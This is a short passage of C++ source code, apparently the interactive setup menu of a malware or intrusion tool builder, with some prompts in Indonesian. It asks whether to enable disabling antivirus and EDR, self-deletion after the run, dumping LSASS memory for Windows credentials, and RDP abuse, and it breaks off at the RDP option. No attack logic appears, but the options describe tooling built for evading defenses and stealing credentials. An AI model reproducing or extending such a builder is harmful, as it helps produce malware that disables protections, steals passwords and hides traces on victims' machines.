    std::cout << "11. Enable AV/EDR Disable? (y/n) [y]: ";
    std::getline(std::cin, input);
    cfg.enable_av_disable = (input != "n" && input != "N");

    std::cout << "12. Self-delete setelah selesai? (y/n) [y]: ";
    std::getline(std::cin, input);
    cfg.self_delete_after = (input != "n" && input != "N");

    std::cout << "13. Enable LSASS Dump? (y/n) [y]: ";
    std::getline(std::cin, input);
    cfg.enable_lsass_dump = (input != "n" && input != "N");

    std::cout << "14. Enable RDP Abuse? (y/n) [y]: ";
